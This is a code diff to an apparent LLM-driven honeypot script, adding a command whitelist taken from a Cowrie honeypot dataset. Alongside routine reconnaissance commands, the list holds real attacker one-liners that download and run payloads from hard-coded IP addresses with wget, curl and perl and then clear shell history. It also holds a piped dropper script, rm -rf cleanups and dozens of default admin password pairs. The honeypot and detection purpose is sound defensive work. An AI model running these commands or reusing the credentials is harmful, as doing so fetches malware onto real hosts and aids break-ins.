@@ -137,6 +137,7 @@ def query_ollama(prompt: str, model: str, url: str, temp: float=0.2, timeout: in
             return r0 if isinstance(r0, str) else str(r0)
     return r.text.strip()
 
+"""
 # -------------------------
 # WHITELIST + Prompt builders (uses whitelist)
 # -------------------------
@@ -162,9 +163,112 @@ WHITELIST = [
     "crontab -l", "cat /etc/crontab",
 
     # 🗂 common tmp inspection
-    "ls /tmp", "ls /var/tmp", "cat /tmp/<FILE>", "cat /var/tmp/<FILE>"
-]
+    "ls /tmp", "ls /var/tmp", "cat /tmp/<FILE>", "cat /var/tmp/<FILE>",
 
+    # 🗣 output / shell builtin
+    "echo"
+]
+"""
+
+# ============================================
+# 🧱 WHITELIST COMPLETA (aggregata da dataset Cowrie)
+# ============================================
+
+WHITELIST = [
+    # 🧍‍♂️ User / System info
+    "whoami", "id", "groups", "hostname", "uptime",
+    "uname", "uname -a", "uname -m",
+
+    # 🧠 CPU / Hardware info
+    "cat /proc/cpuinfo",
+    "cat /proc/cpuinfo | grep name | wc -l",
+    "cat /proc/cpuinfo | grep model | grep name | wc -l",
+    "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+    "lscpu", "lscpu | grep Model", "lsmod", "dmidecode|grep Vendor|head -n 1",
+
+    # ⚙️ Process / System monitoring
+    "ps aux", "ps -x", "top", "top -b -n1", "LC_ALL=C top -bn1",
+    "free -m", "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+    "df -h", "w", "who", "env", "dmesg | grep irtual", "lspci | grep irti",
+
+    # 📁 File system / Navigation
+    "ls", "ls -la", "ls -lh", "pwd", "cd /", "cd /tmp", "ls -lh $(which ls)",
+    "ls /tmp", "ls /var/tmp", "cat /tmp/<FILE>", "cat /var/tmp/<FILE>",
+    "cat /var/tmp/.var03522123 | head -n 1", "cat /var/tmp/.systemcache436621",
+
+    # 🧾 Configuration / System files
+    "cat /etc/passwd", "cat /etc/hosts", "cat /etc/os-release", "cat /etc/issue",
+
+    # ⏰ Cron / Scheduling
+    "crontab -l", "cat /etc/crontab",
+
+    # 📡 Networking (read-only)
+    "netstat -tunlp", "ss -tunlp", "ip a", "ifconfig", "ping -c 1 8.8.8.8",
+
+    # 🧩 Temporary / Variable files
+    "echo \"321\" > /var/tmp/.var03522123",
+    "rm -rf /var/tmp/.var03522123",
+    "rm -rf /var/tmp/dota*",
+    "rm /tmp/foo; touch /tmp/foo;", "ls -al /tmp/foo;", "rm /tmp/foo;",
+
+    # 🧮 Miscellaneous commands
+    "^C",
+
+    # 💾 Potential malicious / propagation commands (kept for detection context, not to execute)
+    "killall -9 perl;cd /var/tmp/ ; cd /tmp/ ; rm -rf ssh1.txt ; wget http://185.234.217.21/ssh1.txt ; mv ssh1.txt wget.txt ; perl wget.txt 193.169.254.11; lwp-download http://185.234.217.21/ssh1.txt ; mv ssh1.txt lynx.txt ; perl lynx.txt 193.169.254.11;fetch http://185.234.217.21/ssh1.txt ; mv ssh1.txt fetch.txt ; perl fetch.txt 193.169.254.11; curl -O http://185.234.217.21/ssh1.txt ; mv ssh1.txt curl.txt ; perl curl.txt 193.169.254.11 ; rm -rf ssh1.txt wget.txt lynx.txt fetch.txt curl.txt",
+    "cat /etc/issue; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://104.248.150.167/servicesd000/fx19.x86; cat fx19.x86 > sshupdate; chmod +x *; ./sshupdate r00ted; history -c",
+    "cat /etc/issue; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://104.248.150.167/servicesd000/fx19.x86; cat fx19.x86 > ssh-xuma19; chmod +x ssh-xuma19; ./ssh-xuma19 r00ted; history -c",
+    "echo \"cd /tmp; wget http://46.246.45.171/wget.sh || curl http://46.246.45.171/curl.sh -o curl.sh; chmod +x *.sh; ./wget.sh; ./curl.sh\" | sh",
+    "cd /tmp; wget google.com",
+
+    # 🔐 echo password attempts (for detection, sanitized)
+    "echo \"admin guest\" > /tmp/up.txt",
+    "echo \"admin admin1234\" > /tmp/up.txt",
+    "echo \"admin 7ujMko0admin\" > /tmp/up.txt",
+    "echo \"admin P@55w0rd\" > /tmp/up.txt",
+    "echo \"admin access\" > /tmp/up.txt",
+    "echo \"admin letmein\" > /tmp/up.txt",
+    "echo \"admin articon\" > /tmp/up.txt",
+    "echo \"admin nimda\" > /tmp/up.txt",
+    "echo \"admin administrador\" > /tmp/up.txt",
+    "echo \"admin p@$$wOrd\" > /tmp/up.txt",
+    "echo \"admin password\" > /tmp/up.txt",
+    "echo \"admin 123123\" > /tmp/up.txt",
+    "echo \"admin qwe@1234\" > /tmp/up.txt",
+    "echo \"admin qwe123\" > /tmp/up.txt",
+    "echo \"admin 1q2w3e4r5t6y\" > /tmp/up.txt",
+    "echo \"admin 4dm1n\" > /tmp/up.txt",
+    "echo \"admin nospam\" > /tmp/up.txt",
+    "echo \"admin changeme\" > /tmp/up.txt",
+    "echo \"admin P@ssw0rds\" > /tmp/up.txt",
+    "echo \"admin songswell\" > /tmp/up.txt",
+    "echo \"admin p@55w0rd\" > /tmp/up.txt",
+    "echo \"admin qaz_2wsx\" > /tmp/up.txt",
+    "echo \"admin !QAZ2wsx#EDC\" > /tmp/up.txt",
+    "echo \"admin root\" > /tmp/up.txt",
+    "echo \"admin !QAZ@WSX#EDC\" > /tmp/up.txt",
+    "echo \"admin super\" > /tmp/up.txt",
+    "echo \"admin sysmail\" > /tmp/up.txt",
+    "echo \"admin 1qaz$RFV\" > /tmp/up.txt",
+    "echo \"admin service\" > /tmp/up.txt",
+    "echo \"admin secure\" > /tmp/up.txt",
+    "echo \"admin password!\" > /tmp/up.txt",
+    "echo \"admin P455w0rd@dm1n\" > /tmp/up.txt",
+    "echo \"admin P@ssword1!\" > /tmp/up.txt",
+    "echo \"admin AitbISP4eCiG\" > /tmp/up.txt",
+    "echo \"admin !@#$abcd,\" > /tmp/up.txt",
+    "echo \"admin 22222\" > /tmp/up.txt",
+    "echo \"admin qd8899xyz\" > /tmp/up.txt",
+    "echo \"admin qwertyu\" > /tmp/up.txt",
+    "echo \"admin qweasdzxc\" > /tmp/up.txt",
+    "echo \"admin sysadm\" > /tmp/up.txt",
+    "echo \"admin change\" > /tmp/up.txt",
+    "echo \"admin cat1029\" > /tmp/up.txt",
+    "echo \"admin PasswOrd\" > /tmp/up.txt",
+    "echo \"admin qwedcxz\" > /tmp/up.txt",
+    "echo \"admin support\" > /tmp/up.txt",
+    "echo \"admin ubnt\" > /tmp/up.txt"
+]
 
 def make_prompt_topk_from_context(context: list[str], k: int) -> str:
     """
